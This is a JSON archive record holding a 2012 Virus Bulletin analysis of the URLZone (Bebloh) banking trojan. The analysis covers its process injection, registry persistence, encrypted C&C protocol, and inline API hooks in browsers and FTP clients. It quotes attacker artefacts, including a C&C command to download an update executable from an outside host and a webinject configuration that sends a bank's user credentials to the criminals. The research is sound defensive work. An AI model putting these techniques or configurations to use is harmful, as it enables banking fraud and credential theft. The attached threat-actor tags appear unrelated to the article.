@@ -1,0 +1,144 @@
+{
+    "id": "d308c558-55c1-4ddf-99bd-ee4726f4b63a",
+    "created_at": "2023-01-12T15:07:48.977311Z",
+    "updated_at": "2025-03-27T02:12:11.099782Z",
+    "deleted_at": null,
+    "sha1_hash": "aed76ca8f908bbbf7289b501cdafd210bd851c25",
+    "title": "2012-09-01 - URLZone reloaded- new evolution",
+    "authors": "",
+    "file_creation_date": "2022-05-28T21:44:34Z",
+    "file_modification_date": "2022-05-28T21:44:34Z",
+    "file_size": 587807,
+    "plain_text": "# URLZone reloaded: new evolution\n\n**[virusbulletin.com/virusbulletin/2012/09/urlzone-reloaded-new-evolution/](https://www.virusbulletin.com/virusbulletin/2012/09/urlzone-reloaded-new-evolution/)**\n\n2012-09-01\n\n### Neo Tan\n\nFortinet, Canada Editor: Helen Martin\n**Abstract**\n\nMIB banking trojan URLZone dates back to 2009, and unlike other botnets it still uses a\ncentralized communication system. Although less flexible than other P2P botnets, its refined\nmethod of injection, old-fashioned centralized topology and a low-profile attitude make it very\nsuccessful. Neo Tan takes an in-depth look.\n\nThe first variant of URLZone (a.k.a. Bebloh) was found dating back to September 2009. At\nthat time, it was described as a man-in-the-browser (MIB) banking trojan. Its hooking\ntechnique and its process of stealing money from victims were similar to another, more\ninfamous bot, Zeus. The focus of this bot is to steal money from targeted financial institutions\nand hide the transactions from the victim.\n\nUnlike many bots that now use P2P for communication, URLZone still uses a centralized\ncommunication system. Although P2P increases the expandability and robustness of a\nbotnet, for a P2P botnet such as Zeus and Kelihos, it is fairly feasible for analysts to build a\ntracker to harvest the victim IP lists and update files, since all the information (server IPs,\nupdate files, configuration files, etc.) must be contained in the traffic. For a centralized botnet\non the other hand, if the C&C server list is not updated dynamically through communication,\nit would be very challenging to build a tracker system. Because the IPs or the URLs of the\nC&C servers change all the time, and the only way of determining them is to decrypt the\nlatest botnet installer before the change, it is not easy to obtain the active C&C server lists\nand thus, the update files. Besides which, the list of banks and institutions URLZone targets\nis restricted – it has successfully been keeping a low profile since 2009. However, it is still\nout there, and it has evolved.\n\n## Infiltration/installation\n\nMost of the samples we obtained came as attachments to spam emails pretending to be a\nDHL package notice or holiday booking confirmation.\n\n\n-----\n\nUpon executing, URLZone first uses IsWow64Process to check the version of the current\nOS. If the OS is 64-bit, it creates the process: %ProgramFiles%\\Internet\nExplorer\\iexplore.exe, then injects it. If the OS is 32-bit, it uses GetVersion to see if the\ndwMajorVersion is lower than 6 (i.e. whether it is a Windows version that is older than Vista,\nsuch as Windows Server 2003 or Windows XP). If the current MajorVersion is 6, it looks for\nand injects the explorer.exe process with the same code as that used to inject the 64-bit OS.\nOtherwise, it uses NtQuerySystemInformation with the SystemInformationClass parameter\nset to an undocumented value: 0x10 (SystemHandleInformation) to enumerate the handles\nopened by the smss.exe process, and then looks for the csrss.exe process in the handles. If\nthere is one, it calls DuplicateHandle to duplicate the handle to the current process and then\ninjects the malicious code into csrss.exe. Figure 1 shows the smss.exe process’s csrss.exe\nhandle being duplicated to the bot installer process update2.exe.\n\n**Figure 1. Handle to csrss.exe is duplicated (shared) by the malware.**\n\nIf it does not find the csrss.exe process in the handles, it will try a less stealthy method,\nwhich is to open csrss.exe directly using its process ID obtained from the\nCreateToolhelp32Snapshot call. If all these attempts fail, it will pick the explorer.exe process\nand inject the same code as it used to inject the 64-bit OS. Figure 2 shows the two branches\nloading different injecting subroutines.\n\n\n-----\n\n**Figure 2. Two injecting subroutines (circled in red) for different versions of Windows.**\n\nBefore it calls CreateRemoteThread to run the injected code, it inserts an argument into the\nmemory space of the targeted process with format: [update] [autorun][installer path] (e.g. ‘+C:\\test\\ppp.exe’ means this is not an update; autorun is enabled; and the installer file is\nlocated at ‘C:\\test\\ppp.exe’).\n\nThe two kinds of injecting subroutines that it uses to inject the different OS versions are\nsimilar, since the final goal of both is to hook a list of selected applications and communicate\nwith the C&C server to get updates. The major difference is the methods they use to hook,\nbecause they are in different environments. In this article we will focus on the code that is\ndesigned to inject csrss.exe (‘main0_32’ in Figure 2).\n\nAfter some common routines such as resolving APIs and dropping itself, the subroutine will\naccomplish four tasks. In order, these are: injecting the communication subroutine into\nsvchost.exe, injecting a registry-monitoring subroutine into winlogon.exe, hooking a list of\napplications, and updating itself if necessary. These tasks involve multiple processes, and\nthe bot needs a way to share data among them. Its data-sharing mechanism is enabled by\nimplementing the memory-mapped files that the system paging file stores [1]. This is the core\ntechnique used by this bot in order to share data in the multi-process environment. At first, it\ncalls CreateFileMapping with INVALID_HANDLE_VALUE as hFile and a hard-coded name\nstored in the installer as lpName (e.g. some random name such as ‘xajlwdxq’). These are\n\n\n-----\n\nalso the value names the bot uses to store the data under a registry subkey which is hardcoded in the installer: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet\nSettings\\5.0\\[random]\\. The location of the name is unique and will be used by the following\nOpenFileMapping calls in the other processes. There are in total two views created with\ndifferent names, with the dwMaximumSizeLow parameter of one being 0x52E, and the other\nbeing 0x80400. The bigger view is the container of the configuration file; the other is the\nstorage for the C&C response.\n\nThe subroutine injected into winlogon.exe is a process that monitors and modifies the\nregistry to make sure the bot survives after reboot. It first looks for and deletes the subkey\nHKLM\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls. Then it gets the\npath name from the subkey Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Userinit, which\nin my 32-bit Windows XP environment, is ‘C:\\Windows\\System32\\userinit.exe’. If it finds out\nthat the subkey value does not point to userinit.exe, it will modify it and make sure it does.\nThis looks like a self-defence mechanism against other malware, or maybe an upgrade from\nthe previous version.\n\nAt the end, there is a loop which keeps checking the response from the C&C in the shared\nview, updating the configuration file stored in the registry and downloading the new update\nfiles. Then it drops the file to %SYSTEMDRIVE%\\WINDOWS\\system32\\[random].exe. It\nmodifies the registry key HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image\nFile Execution Options\\userinit.exe\\Debugger to point to the dropped file. The technique\nused here is called the ‘Image Hijack’. Every time Windows starts, it will execute userinit.exe,\nhence it is redirected to call the dropped file.\n\n## C&C communication\n\nThe subroutine injected into svchost.exe is responsible for the communication between the\nvictim’s PC and the C&C server to get the latest configuration information and update files. It\nsends an initial message to the C&C servers in its hard-coded list. Usually there are four or\nfive domains hard-coded in the file. If any of them respond with either a ‘CMD0’ message or\na configuration file, it will retry the communication in approximately three hours. If the\nresponse is ‘>UD [update file URL]’, it will update itself with the new file, which probably\ncontains a new hard-coded C&C server list.\n\n\n-----\n\n**Figure 3. C&C communication flow chart for updating the bot itself and the**\n**configuration file.**\n\nThe following is an example of the initial message the bot tries to send after gathering the\nvictim’s environmental information, in plain text:\n```\ntver=201206210634&vcmd=0&osver=5.1.2600+Service+Pack+3&ipcnf=192.168.1.13+&sckport=0&c\n&email=\n\n```\nAn explanation of each of the arguments is as follows:\n\n**tver – the build time of the bot.**\n\n**vcmd – the command it received from the server, which initially would be 0.**\n\n**osver – describes the OS version.**\n\n**ipcnf – describes the victim’s IP address (can also be a LAN IP address).**\n\n**sckport – socket port number. This field is always set to 0 in the injecting subroutine**\nfor my 32-bit Windows XP test environment (the branch that uses subroutine\n‘main0_32’ in Figure 2). In other environments, it will be set to an arbitrary port and the\nport will be used to open a back door.\n\n\n-----\n\n**cmobj – two flags are contained here. If the flag is GZ, it means the environment is**\ngzip decoding friendly. If the flag is ‘RX’, it means the environment supports VBScript.\nBoth the GZ and RX checks involve calling CoCreateInstance with hard-coded rclsid\nand riid parameters to get the CComPtr to the interfaces and then utilizing them.\nRespectively, it uses{54C37CD0-D944-11D0-A9F4-006097942311} as rclsid and\n{70BDDE00-C18E-11D0-A9CE-006097942311} as riid to get the\nIEncodingFilterFactory interface pointer for the gzip check, and {3F4DACA4-160D11D2-A8E9-00104B365C9F} as rclsid and {3F4DACB0-160D-11D2-A8E900104B365C9F} as riid to get the IRegExp2 interface pointer for the vbscript check. For\nmore about COM coding, please see [2].\n\n**SHID – a hard-coded value, probably the affiliate ID.**\n\n**email – this argument is always empty.**\n\nTo make it secure, the plain text message will go through a sequence of encoding. This is an\nupgrade since the malware was first discovered in 2009, when it used simple XOR\nencryption. At first, the plain text message will be encoded by base64. Then it appends some\ndata to the beginning of it, some of which is just garbage to scramble the result when it\ncomes to the final encryption. The format is as follows:\n```\n[Message type]&[OS version][Is the configuration saved in registry]&[Version ID]&\n[Hard-coded number]&\n[Random number]&[Random number]&[Random number]&[base64 of the plain text message]&\n\n```\nThis is a sample output made from the previous plain text message:\n```\n2& 5.1.2600.5512\nY!&5OHVWQMV7NRESGKGBT&-922597813&-700445222&-16924818&175856919&P3R2ZXI9MjAxMjA2MjEwNj\nnZjbWQ9MTUmb3N2ZXI9NS4xLjI2MDArU2VydmljZStQYWNrKzMmaXBjbmY9MTkyLjE2OC4xLjEzKyZzY2twb3J\nTSElEPUEwMDAwMDEmZW1haWw9& \n\n```\nThe Message Type tells the C&C server how to parse the message that follows. The range is\nfrom 1 to 9. For example, ‘2’ here means that this is the initial message about the victim’s\nenvironment. And if for some reason (such as being deleted by an anti-virus program) the\nbot cannot find its dropped file, it will send a message with ‘7’ as the message type and the\nlist of current processes as the message body. Figure 4 shows the code sending the\nmessage type ‘7’ if the dropped file ‘defr.exe’ is not found. Most of the other message types\nare used for the communication of the hooked APIs with C&C servers for manipulating the\nvictim’s banking information.\n\n\n-----\n\n**Figure 4. Sending message type ‘7’ when the dropfile ‘defr.exe’ is not found.**\n\nThe ‘N!’ in the example above states that there isn’t a configuration file found in the registry:\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\5.0\\[random]\\[object\nname used for the shared view]. The [Version ID] and [Hard-coded number] are probably\nused to identify the version of this bot, followed by three other randomly generated numbers.\nThe rest is just the base64-encoded plain text message with an ‘&’ at the end.\n\nFinally, a well-known block cipher algorithm called XXTEA is used to add one more\nencryption layer. The key is hard-coded in the bot and so far (as of August 2012), it hasn’t\nchanged since we first discovered this variant in April 2012.\n\nAfter receiving the initial message, if the C&C server is alive, there are mainly three kinds of\nresponse from it:\n\n1. CMD0 – makes the client wait for about three hours and then retry.\n\n\n-----\n\n2. >CV -1 >UD [Update file URL] [Version] – downloads the update file and updates the\n\nbot, e.g. ‘>CV -1 >UD http://www.tri***us.at/templates/mobiltemplate/images/icon.exe\n201206210634’.\n\n3. >CV 15 >DI INJECTFILE [File Size] [Configuration File] – downloads the configuration\n\nfile. The file size is usually around 200 kilobytes.\n\nThe response message is also encrypted using XXTEA with a different key which is also\nhard-coded in the bot. This hasn't been changed for at least five months either. A copy of the\ndecrypted response is also stored in the shared view for the other processes to access.\nAgain, the configuration file is encrypted using XXTEA with another hard-coded key. Here is\njust a small part of the decrypted configuration file:\n```\nINJECTFILE\nITHEADERSCRTIMER=|15000|End\nITHEADERSCRLIMIT=|30|End\nITHEADERSCRMINDELAY=|20000|End\n================================ FIDU ================================\nITSCRHOST=|finanzportal.fiducia.de|End\nITSCRONSUCCESS=|1|End\nITSCRPAGE=|/*/portal*token=*|End\n[ITBEGINBLOCKHOOK]\nITHOST=|finanzportal.fiducia.de|End\nITPAGE=|/*/portal*token=*&C4I89Op=0004|End\nITMETHOD=|211|End\nITREQRXPREQ=||End\nITREQMATH=||End\nITREQCOUNT=||End\nITSRVDATA=|?\nname=FIDU&bal=%FIDUBAL%&lim=&disp=&maxbetrag=%FIDUMAXBETR%&maxbetragsepa=%FIDUMAXBETRS\nhost=finanzportal.fiducia.de&useracc=%FIDURZBK% - %FIDUUSERACC% %HOLDERNAME%&userpass=%FIDUUSERPASS%&exinf\n=%FIDUTANTYPE%&html=&trkid=%FIDUDEFNRSELE%&regexp=unv&hldrn=%HOLDERNAME%&vorg=&injv=20\nITREQSRVERR=|%ITENABLED%=|-1|--%ITSTATUS%=|e|--|End\nITONERR=|99|End\nITIFCONTEXT=|<h1 class=”stackedFrontletTitle”>EURO-&Uuml;berweisung (SEPA)</h1>|End\n[ITENDBLOCKHOOK] \n\n```\nIt is then stored under the registry key:\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\5.0\\[Random]\\\n\n[Object Name Used for the Shared View], encrypted using XOR with a hard-coded key and\ntwo modifiers. The pseudo code of the encryption algorithm is as follows:\n\n\n-----\n\n```\nxorKey 0x58f8;\nmodifier1 = 0xfe97;\nmodifier2 = 0x11c6;\nfor(i = datasize; i > 0; i--)\n{\n data ^= (xorKey>>8);\n temp = data + xorKey;\n temp2 = temp*modifier1;\n temp2 += modifier2;\n xorKey = (unsigned_short)temp2;\n}\n\n```\nThis configuration file contains the URLs of the targeted financial institution, request mask\ntemplates, HTML injecting templates and other information that is used by the hooked APIs\nto make fraudulent transactions and create fake transaction logs.\n\n## Inline API hooks\n\nAfter the injection of svchost.exe and winlogon.exe, it creates a thread that monitors the\ncurrent running applications. In order, they are:\n\n1. thebat.exe\n\n2. msimn.exe\n\n3. iexplore.exe\n\n4. explorer.exe\n\n5. myie.exe\n\n6. firefox.exe\n\n7. mozilla.exe\n\n8. avant.exe\n\n9. maxthon.exe\n\n10. OUTLOOK.EXE\n\n11. ftpte.exe\n\n12. coreftp.exe\n\n13. filezilla.exe\n\n14. TOTALCMD.EXE\n\n\n-----\n\n15. cftp.exe\n\n16. FTPVoyager.exe\n\n17. SmartFTP.exe\n\n18. WinSCP.exe\n\nThey are mainly web browsers, email clients and ftp clients. Most of the APIs the bot is\ninterested in hooking are the ones responsible for Internet connection. Since different\napplications do not necessarily import the same APIs, it crafted three kinds of API-hooking\nsubroutines to suit them. Among these applications, numbers 1, 2 and 10–18 are to be\ninjected with subroutine#1; numbers 6 and 7 are to be injected with subroutine#3; and the\nrest are to be injected with subroutine#2.\n\nIn subroutine#1, it looks for and hooks InternetReadFile, HttpSendRequestA,\nHttpSendRequestW, InternetConnectA, HttpOpenRequestA, InternetQueryDataAvailable,\nInternetCloseHandle, InternetReadFileExA, InternetReadFileExW, InternetOpenA,\nHttpQueryInfoA and HttpQueryInfoW of wininet.dll, and send, connect and closesocket of\nwsock32.dll.\n\nIn subroutine#2, it looks for and hooks InternetReadFile, HttpSendRequestA,\nHttpSendRequestW, InternetConnectA, HttpOpenRequestA, InternetQueryDataAvailable,\nInternetCloseHandle, InternetReadFileExA, InternetReadFileExW, InternetOpenA,\nHttpQueryInfoA and HttpQueryInfoW of wininet.dll, and CreateProcessW of kernel32.dll. It\nalso contains a loop checking the C&C response, updating the configuration file and the bot\nitself.\n\nFigure 5 shows a snippet of the assembly code of the hooking of wininet.dll APIs in\nsubroutine#2. Before each hookapi call, register EDX contains the hashcode identifying the\nAPI, and EAX contains the library name: ‘wininet’. The hooking technique in the ‘hookapi’\nfunction is called Inline Hooking. It takes advantage of the fact that, for the targeted APIs in\n_Windows XP SP2 and later the first five bytes are intentionally aligned for easy hot-patching._\nIt locates the calling address of the API (e.g. 0x766982E2 in Figure 6) and patches the first\nfive bytes with an unconditional jump ‘E9 xx xx xx xx’ to the hook subroutine, which is also\ncalled the trampoline (e.g. 0x410F7C in Figure 6).\n\n\n-----\n\n**Figure 5. Snippet code of hooking APIs.**\n\n**Figure 6. Hooking wininet.InternetReadFile (0x766982E2) in progress in OllyDbg.**\n**0x410F7C is the address of hookedInternetReadFile.**\n\n\n-----\n\nThen it saves the first five bytes followed by an unconditional jump (the jump redirects the\ncontrol flow back to the original API address + 5, e.g. 0X766982E2+5, jmp\nwininet.766982E7, as shown in Figure 7) to a dynamically allocated memory. It stores these\n‘restoring addresses’ in an array. Every hooked subroutine will eventually have call to lead\nback to its restoring point in the dynamically allocated memory. So each time an injected\napplication invokes the hooked functions, it will still seem to be behaving like the original one.\n\n**Figure 7. Restoring addresses array.**\n\nSubroutine#3 is almost identical to #2, except it looks for and hooks PR_Write, PR_Read\nand PR_DestroyPollableEvent of nspr4.dll instead of CreateProcessW, since its target\napplications are both from Mozilla Project.\n\nThe hooked subroutine contains the core functions for masking domain URLs, modifying\nreceived messages and altering sending messages. For example, the hooked functions for\nthe Internet reading APIs, such as InternetReadFile have the ability to filter out or alter the\nreceived data, according to the latest loaded configuration file in the shared view. And the\nhooked functions for the Internet sending APIs, such as HttpSendRequestA, modify the\nsending message according to the configuration file. The hooked function for\nInternetConnectA can send reports to the C&C server and mask the URLs of the pages the\nvictim tries to create a connection to. With the specific APIs hooked, the bot has\ncomprehensive control of the ingoing and outgoing Internet messages of the victim PC\nthrough the targeted applications.\n\n## Conclusion\n\nURLZone is a MIB banking trojan with a long history. Although it is less flexible than Zeus\nand other P2P botnets, its refined method of injection and its good-old-fashioned centralized\ntopology, together with a low-profile attitude make it very successful.\n\n### Bibliography\n\n[1] Creating Named Shared Memory. http://msdn.microsoft.com/enus/library/windows/desktop/aa366551%28v=vs.85%29.aspx.\n\n\n-----\n\n[2] Com Coding Practices. http://msdn.microsoft.com/enus/library/windows/desktop/ff485839%28v=vs.85%29.aspx.\n\n## Latest articles:\n\n### Cryptojacking on the fly: TeamTNT using NVIDIA drivers to mine cryptocurrency\n\nTeamTNT is known for attacking insecure and vulnerable Kubernetes deployments in order\nto infiltrate organizations’ dedicated environments and transform them into attack\nlaunchpads. In this article Aditya Sood presents a new module introduced by…\n\n### Collector-stealer: a Russian origin credential and information extractor\n\nCollector-stealer, a piece of malware of Russian origin, is heavily used on the Internet to\nexfiltrate sensitive data from end-user systems and store it in its C&C panels. In this article,\nresearchers Aditya K Sood and Rohit Chaturvedi present a 360…\n\n### Fighting Fire with Fire\n\nIn 1989, Joe Wells encountered his first virus: Jerusalem. He disassembled the virus, and\nfrom that moment onward, was intrigued by the properties of these small pieces of selfreplicating code. Joe Wells was an expert on computer viruses, was partly…\n\n### Run your malicious VBA macros anywhere!\n\nKurt Natvig wanted to understand whether it’s possible to recompile VBA macros to another\nlanguage, which could then easily be ‘run’ on any gateway, thus revealing a sample’s true\nnature in a safe manner. In this article he explains how he recompiled…\n\n### Dissecting the design and vulnerabilities in AZORult C&C panels\n\nAditya K Sood looks at the command-and-control (C&C) design of the AZORult malware,\ndiscussing his team's findings related to the C&C design and some security issues they\nidentified during the research.\n\n[Bulletin Archive](https://www.virusbulletin.com/virusbulletin/archive)\n\n_Copyright © 2012 Virus Bulletin_\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2012/2012-09-01 - URLZone reloaded- new evolution.pdf"
+    ],
+    "report_names": [
+        "2012-09-01 - URLZone reloaded- new evolution.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
+            "created_at": "2022-10-25T16:07:24.139848Z",
+            "updated_at": "2025-03-27T02:02:10.120505Z",
+            "deleted_at": null,
+            "main_name": "Safe",
+            "aliases": [],
+            "source_name": "ETDA:Safe",
+            "tools": [
+                "DebugView",
+                "LZ77",
+                "OpenDoc",
+                "SafeDisk",
+                "TypeConfig",
+                "UPXShell",
+                "UsbDoc",
+                "UsbExe"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "f809bfcb-b200-4988-80a8-be78ef6a52ef",
+            "created_at": "2023-01-06T13:46:39.186988Z",
+            "updated_at": "2025-03-27T02:00:03.016358Z",
+            "deleted_at": null,
+            "main_name": "TeamTNT",
+            "aliases": [
+                "Adept Libra"
+            ],
+            "source_name": "MISPGALAXY:TeamTNT",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "c3ca592f-0669-49bd-ab5c-310007ab2fb4",
+            "created_at": "2022-10-25T15:50:23.334495Z",
+            "updated_at": "2025-03-27T02:00:55.445098Z",
+            "deleted_at": null,
+            "main_name": "TeamTNT",
+            "aliases": [
+                "TeamTNT"
+            ],
+            "source_name": "MITRE:TeamTNT",
+            "tools": [
+                "Peirates",
+                "MimiPenguin",
+                "LaZagne",
+                "Hildegard"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        },
+        {
+            "id": "e993faab-f941-4561-bd87-7c33d609a4fc",
+            "created_at": "2022-10-25T16:07:23.460301Z",
+            "updated_at": "2025-03-27T02:02:09.814816Z",
+            "deleted_at": null,
+            "main_name": "Longhorn",
+            "aliases": [
+                "APT-C-39",
+                "Platinum Terminal",
+                "The Lamberts"
+            ],
+            "source_name": "ETDA:Longhorn",
+            "tools": [
+                "Black Lambert",
+                "Blue Lambert",
+                "Corentry",
+                "Cyan Lambert",
+                "Fluxwire",
+                "Gray Lambert",
+                "Green Lambert",
+                "Magenta Lambert",
+                "Pink Lambert",
+                "Plexor",
+                "Purple Lambert",
+                "Silver Lambert",
+                "Violet Lambert",
+                "White Lambert"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "70db80bd-31b7-4581-accb-914cd8252913",
+            "created_at": "2023-01-06T13:46:38.57727Z",
+            "updated_at": "2025-03-27T02:00:02.865012Z",
+            "deleted_at": null,
+            "main_name": "Longhorn",
+            "aliases": [
+                "the Lamberts",
+                "APT-C-39",
+                "PLATINUM TERMINAL"
+            ],
+            "source_name": "MISPGALAXY:Longhorn",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673536068,
+    "ts_updated_at": 1743041531,
+    "ts_creation_date": 1653774274,
+    "ts_modification_date": 1653774274,
+    "files": {
+        "pdf": "https://archive.orkl.eu/aed76ca8f908bbbf7289b501cdafd210bd851c25.pdf",
+        "text": "https://archive.orkl.eu/aed76ca8f908bbbf7289b501cdafd210bd851c25.txt",
+        "img": "https://archive.orkl.eu/aed76ca8f908bbbf7289b501cdafd210bd851c25.jpg"
+    }
+}
